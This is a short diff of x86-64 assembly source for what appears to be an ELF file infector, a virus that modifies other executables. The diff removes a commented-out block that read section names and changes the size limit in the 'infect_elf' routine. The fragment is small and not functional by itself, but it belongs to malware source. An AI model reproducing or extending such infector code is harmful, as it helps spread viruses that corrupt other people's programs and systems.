@@ -167,11 +167,6 @@ modify_sections:
 		mul rbx
 		lea rdi, [r10 + rax]	; rdi: current shdr
 
-		;xor rdx, rdx
-		;mov edx, DWORD[rdi + shdr.sh_name]
-		;mov rsi, QWORD[r8 + elf_struc.shdr_names]
-		;add rsi, rdx			;rsi has the sct name sct name
-
 		mov esi, DWORD[rdi + shdr.sh_type]
 		cmp rax, 8
 		je while_shdr_to_modify ; if not bss section
@@ -496,7 +491,8 @@ infect_elf:		; r8:elf_struc
 	je infect_elf_end
 
 	mov rdi, QWORD[r8 + elf_struc.bits_added]
-	cmp rdi, 3000000
+	add rdi, QWORD[r8 + elf_struc.stat + stat.st_size]
+	cmp rdi, 5000000
 	jg infect_elf_end
 
 	mov rdi, QWORD[r8 + elf_struc.data_phdr]
